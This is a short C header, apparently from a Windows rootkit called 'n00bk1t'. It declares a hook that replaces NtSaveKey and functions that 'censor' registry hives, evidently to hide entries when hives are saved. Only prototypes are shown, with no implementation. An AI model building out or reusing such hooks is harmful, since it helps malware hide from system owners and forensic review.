#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

typedef NTSTATUS (WINAPI* NTSAVEKEY)(HANDLE,HANDLE);

NTSTATUS CensorRegHive(HANDLE);
NTSTATUS CensorRegHiveInMemory(PVOID);
static int n00bk1t_name_test(const void*,int);

#ifndef __NTSAVEKEY__
#define __NTSAVEKEY__

NTSAVEKEY OldNtSaveKey;
NTSTATUS WINAPI NewNtSaveKey(HANDLE,HANDLE);

#endif 